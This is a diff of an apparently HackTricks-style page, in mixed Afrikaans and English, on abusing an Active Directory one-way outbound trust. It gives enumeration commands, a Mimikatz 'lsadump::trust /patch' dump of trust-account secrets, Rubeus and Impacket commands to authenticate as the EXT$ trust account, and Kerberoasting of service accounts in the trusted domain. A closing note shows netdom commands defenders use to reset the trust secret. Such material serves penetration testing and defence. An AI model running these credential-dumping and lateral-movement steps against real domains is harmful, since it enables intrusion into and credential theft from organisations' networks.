@@ -1,12 +1,12 @@
-# Eksterne Woud-domein - Eenrigting (Uitgaand)
+# External Forest Domain - One-Way (Outbound)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In hierdie scenario **jou domein** is **vertrou** op sommige **voorregte** aan 'n hoof van 'n **verskillende domeine**.
+In hierdie scenario **jou domain** **vertrou** sekere **privileges** aan principals van 'n **ander domain/forest**.
 
-## Opname
+## Enumeration
 
-### Uitgaande Vertroue
+### Outbound Trust
 ```bash
 # Notice Outbound trust
 Get-DomainTrust
@@ -28,46 +28,101 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
+As jy die AD module beskikbaar het, inspekteer die **Trusted Domain Object (TDO)** ook direk. Dit gee jou die rou LDAP-ondersteunde trust data wat jy later sal nodig hê wanneer jy besluit of die maklike pad **FSP/group abuse** of **trust-account abuse** is:
+```powershell
+# Enumerate the TDO created for the foreign forest/domain
+Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
+Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged
+
+# Fast trust hygiene check from the outbound side
+Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
+```
+Jy behoort ook te lys waar die foreign principals van `CN=ForeignSecurityPrincipals` eintlik toegang toegestaan is. Algemene oorwinnings is:
+
+- **Local admin** op 'n server/DC in jou huidige domain
+- Membership in 'n **custom domain group** wat ACLs oor users/computers/GPOs het
+- Rights om **computer objects** te wysig, wat later [RBCD](resource-based-constrained-delegation.md) kan word as die trust configuration dit toelaat
+
 ## Trust Account Attack
 
-'n Sekuriteitskwesbaarheid bestaan wanneer 'n vertrouensverhouding tussen twee domeine gevestig word, hier geïdentifiseer as domein **A** en domein **B**, waar domein **B** sy vertroue na domein **A** uitbrei. In hierdie opstelling word 'n spesiale rekening in domein **A** geskep vir domein **B**, wat 'n belangrike rol speel in die verifikasieproses tussen die twee domeine. Hierdie rekening, geassosieer met domein **B**, word gebruik om kaartjies te enkripteer vir toegang tot dienste oor die domeine.
+Wanneer 'n eenrigting-trust geskep word van domain/forest **B** na domain/forest **A** (**B trusts A**), word 'n **trust account** vir **B** in **A** geskep. In die outbound-trust view van **A** is dit nuttig omdat as jy later **B** kompromitteer (die trusting side), jy die trust secret daar kan dump en terug na **A** kan authenticate as `B$`.
 
-Die kritieke aspek om hier te verstaan, is dat die wagwoord en hash van hierdie spesiale rekening uit 'n Domeinbeheerder in domein **A** onttrek kan word met behulp van 'n opdraglyn hulpmiddel. Die opdrag om hierdie aksie uit te voer is:
+Die kritieke aspek om hier te verstaan is dat die password en Kerberos material vir daardie trust account onttrek kan word vanaf 'n Domain Controller in die **trusting** domain met behulp van:
 ```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-Hierdie ekstraksie is moontlik omdat die rekening, geïdentifiseer met 'n **$** na sy naam, aktief is en behoort tot die "Domain Users" groep van domein **A**, wat die regte wat met hierdie groep geassosieer word, erf. Dit stel individue in staat om teen domein **A** te autentiseer met die kredensiale van hierdie rekening.
+Dit werk omdat die trust account wat in die **trusted** domain geskep is, ’n geaktiveerde principal is wat uiteindelik die basiese regte van ’n gewone domain user daar kry. Dit is dikwels genoeg om LDAP te begin enumereer, tickets aan te vra, en die volgende escalation path te vind.
 
-**Waarskuwing:** Dit is haalbaar om hierdie situasie te benut om 'n voet aan die grond in domein **A** te verkry as 'n gebruiker, alhoewel met beperkte regte. Hierdie toegang is egter voldoende om enumerasie op domein **A** uit te voer.
-
-In 'n scenario waar `ext.local` die vertrouende domein is en `root.local` die vertroude domein is, sal 'n gebruikersrekening met die naam `EXT$` binne `root.local` geskep word. Deur spesifieke gereedskap is dit moontlik om die Kerberos vertrouingssleutels te dump, wat die kredensiale van `EXT$` in `root.local` onthul. Die opdrag om dit te bereik is:
+In ’n scenario waar `ext.local` die **trusting** domain is en `root.local` die **trusted** domain, word ’n user account genaamd `EXT$` binne `root.local` geskep. Om die trust keys uit `ext.local` te dump, onthul credentials wat as `root.local\EXT$` teen `root.local` gebruik kan word:
 ```bash
 lsadump::trust /patch
 ```
-Hierdie kan gebruik word om die onttrokken RC4-sleutel te gebruik om as `root.local\EXT$` binne `root.local` te autentiseer met 'n ander hulpmiddelopdrag:
+Volg hierna die onttrekte **RC4**-sleutel om as `root.local\EXT$` binne `root.local` te verifieer:
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-Hierdie verifikasiefase maak dit moontlik om dienste binne `root.local` te tel en selfs te benut, soos om 'n Kerberoast-aanval uit te voer om diensrekening geloofsbriewe te onttrek met:
+Noem dan die trusted domain as daardie principal, byvoorbeeld deur 'n hoë-waarde SPN in `root.local` te Kerberoast:
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
-### Versameling van duidelike teks vertrou password
+### Van Linux
 
-In die vorige vloei is die vertrou hash gebruik in plaas van die **duidelike teks wagwoord** (wat ook **deur mimikatz gedump is**).
+As jy die **RC4** trust-account-sleutel herstel het, werk dieselfde idee vanaf Linux met Impacket:
+```bash
+python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
+export KRB5CCNAME=EXT\$.ccache
 
-Die duidelike teks wagwoord kan verkry word deur die \[ CLEAR ] uitvoer van mimikatz van hexadecimaal te omskakel en null bytes ‘\x00’ te verwyder:
+# Kerberoast from the trusted domain as the trust account
+GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast
 
-![](<../../images/image (938).png>)
+# Or reduce noise and request only one user
+GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
+```
+As **RC4** nie aanvaar word nie, val terug op die herstelde **cleartext password** (of afgeleide **AES** keys) en hergebruik die gewone [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) en [Kerberoast](kerberoast.md) werkvloeie vanaf daardie foothold.
 
-Soms, wanneer 'n vertrou verhouding geskep word, moet 'n wagwoord deur die gebruiker vir die vertrou ingetik word. In hierdie demonstrasie is die sleutel die oorspronklike vertrou wagwoord en dus menslik leesbaar. Soos die sleutel siklusse (30 dae), sal die duidelike teks nie menslik leesbaar wees nie, maar tegnies steeds bruikbaar.
+### Key material gotchas
 
-Die duidelike teks wagwoord kan gebruik word om gereelde outentisering as die vertrou rekening uit te voer, 'n alternatief om 'n TGT aan te vra met die Kerberos geheime sleutel van die vertrou rekening. Hier, om root.local van ext.local te ondervra vir lede van Domain Admins:
+Moenie **trust keys** en **trust-account credentials** deurmekaar maak nie:
 
-![](<../../images/image (792).png>)
+- In ’n one-way trust stoor albei kante ’n **TDO**, maar die werklike **`EXT$` user account** bestaan net in die trusted domain.
+- Die huidige trust-account password word weerspieël in die TDO trust secret (`NewPassword` / current trust key).
+- Die **RC4** trust key is die maklikste artifact om vir `asktgt` as die trust account te hergebruik; in verstek-opstellings is dit gewoonlik die werkende enctype omdat die trust account dikwels ’n leë `msDS-SupportedEncryptionTypes` het.
+- As jy in terme van **AES trust keys** dink, onthou hulle is nie uitruilbaar met die trust-account AES keys nie omdat die salts verskil.
 
+Dus, vir die technique op hierdie page, verkies óf die gedumpte **RC4** material óf die herstelde **cleartext** password.
+
+### Gathering cleartext trust password
+
+In die vorige flow is die trust hash gebruik in plaas van die **cleartext password** (dit word ook deur **mimikatz** gedump).
+
+Die cleartext password kan verkry word deur die \[ CLEAR ] output van mimikatz van hexadecimal om te skakel en null bytes `\x00` te verwyder:
+
+![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)
+
+Soms, wanneer ’n trust relationship geskep word, moet ’n password deur die user vir die trust ingetik word. In hierdie demonstration is die key die oorspronklike trust password en dus mensleesbaar. Soos die key roteer (verstek: elke 30 days), sal die cleartext gewoonlik ophou om mensleesbaar te wees, maar is dit nog tegnies bruikbaar.
+
+Die cleartext password kan gebruik word om gewone authentication as die trust account uit te voer, as ’n alternatief om ’n TGT met die Kerberos secret key van die trust account aan te vra. Hier, die navraag van `root.local` vanaf `ext.local` vir members van `Domain Admins`:
+
+![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)
+
+### Practical limitations
+
+> [!WARNING]
+> Trust accounts is ongemaklike principals. Interactive logons soos **RUNAS / console / RDP** is nie die verwagte pad hier nie, en **NTLM** authentication pogings kan misluk met `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Beplan eerder vir **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).
+
+### Persistence / cleanup note
+
+As defenders besef die trusting domain is gekompromitteer, moet hulle die trust secret aan **beide kante** roteer met `netdom trust ... /resetOneSide ...`. Vanuit ’n operator-perspektief is dit belangrik omdat ’n **manual reset die ou trust material onmiddellik ongeldig maak**, terwyl normale trust-password rotation huidige/vorige values tydens rollover behou.
+```bash
+# Run once from the trusted side
+netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
+
+# Run once from the trusting side
+netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
+```
 ## Verwysings
 
-- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
+- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
+- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
 
 {{#include ../../banners/hacktricks-training.md}}
